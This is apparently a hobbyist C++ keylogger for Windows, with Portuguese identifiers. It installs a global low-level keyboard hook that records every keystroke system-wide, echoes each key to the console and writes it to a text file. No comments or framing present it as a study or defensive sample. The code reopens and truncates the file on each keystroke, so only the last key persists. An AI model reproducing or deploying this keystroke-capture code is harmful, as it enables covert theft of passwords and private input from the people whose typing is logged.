#include <iostream>
#include <windows.h>
#include <stdio.h>
#include <fstream>
#include <string>
#include <iterator>
#include <charconv>

using namespace std;

HHOOK hook;

LRESULT CALLBACK funcHook(int codigo, WPARAM wParam, LPARAM lParam);

int filetr;

int main()
{
    MSG msg;
    hook = SetWindowsHookExA(WH_KEYBOARD_LL, funcHook, NULL, 0);
    if (hook == NULL) {
        cout << "Deu erro";
        return 1;
    }

    while (GetMessage(&msg, NULL, 0, 0) != 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hook);
}


LRESULT CALLBACK funcHook(int codigo, WPARAM wParam, LPARAM lParam) {
    PKBDLLHOOKSTRUCT kbDllHook = (PKBDLLHOOKSTRUCT)lParam;
    
    if (wParam == WM_KEYDOWN && codigo == HC_ACTION) {
        ofstream MyFile("filename.txt");
        filetr = kbDllHook->vkCode;
        MyFile << char(filetr);
        MyFile << "\n";
        printf("%c", filetr);
        printf("\n");
        MyFile.close();
    }
    
    return CallNextHookEx(hook, codigo, wParam, lParam);
}